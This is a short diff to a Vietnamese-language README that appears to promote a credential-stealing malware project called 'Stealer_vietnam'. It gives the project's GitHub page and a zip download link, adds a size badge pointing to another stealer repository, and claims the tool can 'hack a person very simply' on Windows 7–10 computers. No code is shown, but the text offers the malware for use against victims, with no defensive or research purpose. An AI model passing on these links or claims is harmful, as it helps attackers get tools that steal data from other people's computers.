@@ -3,6 +3,7 @@ trang chính chủ:https://github.com/s1uiasdad/Stealer_vietnam
 
 Tải ở https://github.com/s1uiasdad/Stealer_vietnam/archive/refs/heads/main.zip
 
+dung lượng [!](https://img.shields.io/github/repo-size/ChildrenOfYahweh/Kematian-Stealer?color=fa7202)
 
 nó có thể hack 1 người rất đơn giản
 chỉ hack cho máy tính (windows 7 - 10)
